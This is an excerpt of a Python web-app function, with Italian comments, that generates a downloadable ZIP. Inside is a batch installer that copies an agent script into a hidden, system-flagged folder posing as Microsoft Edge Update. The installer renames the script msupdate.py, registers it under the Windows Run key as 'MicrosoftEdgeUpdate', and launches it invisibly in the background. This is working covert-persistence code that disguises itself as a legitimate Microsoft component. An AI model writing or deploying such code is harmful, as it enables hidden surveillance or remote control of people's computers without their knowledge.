...
def download_setup():
    ...
    Genera e scarica uno ZIP con:
      ...
      - svc.cfg   (config file)
      - install.bat (installa deps + aggiunge autostart + avvia invisibile)
    L'utente esegue install.bat UNA sola volta, poi è tutto automatico.
    """
    if "user" not in session: return redirect("/")
    user       = session["user"]
...
set DEST=%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update
mkdir "%DEST%" >nul 2>&1
attrib +h +s "%DEST%" >nul 2>&1

:: Copia file nella cartella nascosta
copy /Y "%~dp0agent.py"  "%DEST%\msupdate.py"  >nul 2>&1
copy /Y "%~dp0svc.cfg"   "%DEST%\svc.cfg"       >nul 2>&1

:: Aggiungi al registro avvio automatico
for /f "tokens=*" %%i in ('where pythonw 2^>nul') do set PYW=%%i
if "%PYW%"=="" for /f "tokens=*" %%i in ('where python 2^>nul') do set PYW=%%i

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "MicrosoftEdgeUpdate" ^
    /t REG_SZ ^
    /d "\"%PYW%\" \"%DEST%\msupdate.py\"" ^
    /f >nul 2>&1

:: Avvia subito in background (invisibile)
start "" /B "%PYW%" "%DEST%\msupdate.py"
...
"""
    ...
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        ...
        z.writestr("install.bat", bat_content)
    buf.seek(0)
